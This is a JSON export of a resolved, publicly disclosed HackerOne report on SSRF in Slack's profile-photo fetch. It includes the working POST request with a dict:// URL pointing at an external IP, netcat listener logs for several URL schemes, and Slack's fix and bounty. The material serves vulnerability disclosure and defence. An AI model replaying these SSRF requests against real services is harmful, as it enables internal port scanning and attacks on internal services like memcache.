{"id":14127,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDEyNw==","url":"https://hackerone.com/reports/14127","title":"SSRF on https://whitehataudit.slack.com/account/photo","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-05-30T12:42:48.729Z","submitted_at":"2014-05-30T12:42:48.729Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"4lemon","url":"/4lemon","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/194/aa0eb7d0d4c0ee7d20ae9b2550953b4eeda26ef9_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":69,"url":"https://hackerone.com/slack","handle":"slack","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Slack","twitter_handle":"slackhq","website":"https://slack.com","about":"All your team communication in one place, instantly searchable, and available wherever you go."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-12-21T10:03:57.732Z","bug_reporter_agreed_on_going_public_at":"2014-11-21T10:03:46.939Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"During post request to https://whitehataudit.slack.com/account/photo:\r\nPOST /account/photo HTTP/1.1\r\nHost: whitehataudit.slack.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://whitehataudit.slack.com/account/photo?url=http%3A%2F%2F95.211.198.76:5555%2Fpicture-54679.jpg\r\nCookie: _ga=GA1.2.1382862309.1401451625; a-2195611171=aP4kbQ9Y8dnl8ZYuS6SK6ZeF%2FyqCF%2Bt1hOMyzdBzvIbWXqrJ8IyG7%2B8S%2FG%2BOkuw9KDY2I%2BXGkTZ80XFYFYznxQ%3D%3D; a=2195611171\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 123\r\n\r\ncrumb=s-1401452311-423d40614d-%E2%98%83\u0026crop=1\u0026url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg\u0026cropbox=0%2C0%2C85\r\n\r\nWe got an SSRF with NOT port whitelist and with NOT disabled wrappers (see below):\r\nnc -lvv 6655\r\nConnection from 184.73.10.28 port 6655 [tcp/*] accepted\r\nGET /picture-54679.jpg HTTP/1.1\r\nUser-Agent: Slackbot (+https://api.slack.com/robots)\r\nHost: 95.211.198.76:6655\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\n\r\ngopher\r\nnc -lvv 6655\r\nConnection from 54.197.108.234 port 6655 [tcp/*] accepted\r\nicture-54679.jpg\r\n\r\n\r\ndict.\r\nnc -lvv 6655\r\nConnection from 107.21.158.167 port 6655 [tcp/*] accepted\r\nCLIENT libcurl 7.22.0\r\npicture-54679.jpg\r\nQUIT\r\n\r\nldap\r\nnc -lvv 6655\r\nConnection from 54.224.81.147 port 6655 [tcp/*] accepted\r\n0\r\n\r\ntelnet\r\nnc -lvv 6655\r\nConnection from 54.224.81.147 port 6655 [tcp/*] accepted\r\n\r\npop3\r\nnc -lvv 6655\r\nConnection from 50.16.108.10 port 6655 [tcp/*] accepted\r\nQUIT\r\n\r\nIt's possible to use it to port scanning (using timing). Good writeup about ssrf vulns: https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit\r\n\r\n\r\n","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-12-21T10:03:47.382Z","allow_singular_disclosure_after":-214803434.18490428,"singular_disclosure_allowed":true,"vote_count":3,"voters":["sw33tlie","spam404","spetr0x"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":62140,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Since we purposefully allow the fetching of any remote image over http(s), what do you suggest as a fix?","automated_response":false,"created_at":"2014-05-30T16:57:54.278Z","updated_at":"2014-05-30T16:57:54.278Z","actor":{"username":"iamcal","cleared":false,"url":"/iamcal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/138/0e164dd6477c48d57f2f5a1c56756f7ec98229cf_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":62415,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Fistable,\n- disable all wrappers except http and https, maybe ftp. Not like now - pop3, tenet, ldap, dict, gopher.\nSecondly, \n- allow only whitelisted port, not like now - any port. \n\nAt this time it is possible to scan port (for example internal network).  Wrappers dict and gopher can be used for attack plain text protocol like memcache. ","automated_response":false,"created_at":"2014-05-30T21:03:29.701Z","updated_at":"2014-05-30T21:03:29.701Z","actor":{"username":"4lemon","cleared":true,"url":"/4lemon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/194/aa0eb7d0d4c0ee7d20ae9b2550953b4eeda26ef9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":62560,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Ahh, I now understand what you're saying. I didn't realize we were allowing other protocols to be used.\n\nI've rolled out a fix to only allow HTTP/HTTPS for fetching here. I don't think we're going to limit ports. Does that fix the issue satisfactorily?","automated_response":false,"created_at":"2014-05-31T00:45:02.334Z","updated_at":"2014-05-31T00:45:02.334Z","actor":{"username":"iamcal","cleared":false,"url":"/iamcal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/138/0e164dd6477c48d57f2f5a1c56756f7ec98229cf_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"4lemon","url":"/4lemon"},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":62569,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This much better than was. And i recommend to disallow requests to either local or public company's infrastructure IPs. This helps to avoid any possible attack vectors.","automated_response":false,"created_at":"2014-05-31T00:54:08.789Z","updated_at":"2014-05-31T00:54:08.789Z","actor":{"username":"4lemon","cleared":true,"url":"/4lemon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/194/aa0eb7d0d4c0ee7d20ae9b2550953b4eeda26ef9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":63903,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks - we'll likely implement something like this in the future. We have a change like this already planned for other components that perform fetches.","automated_response":false,"created_at":"2014-06-02T21:26:31.588Z","updated_at":"2014-06-02T21:26:31.588Z","actor":{"url":"/slack","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Slack"}},"bounty_amount":"300.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"slack","collaborator":{"username":"4lemon","url":"/4lemon"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":165697,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2014-11-21T10:03:46.955Z","updated_at":"2014-11-21T10:03:46.955Z","first_to_agree":true,"actor":{"username":"4lemon","cleared":true,"url":"/4lemon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/194/aa0eb7d0d4c0ee7d20ae9b2550953b4eeda26ef9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":185693,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2014-12-21T10:03:57.746Z","updated_at":"2014-12-21T10:03:57.746Z","actor":{"url":"/slack","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Slack"}},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}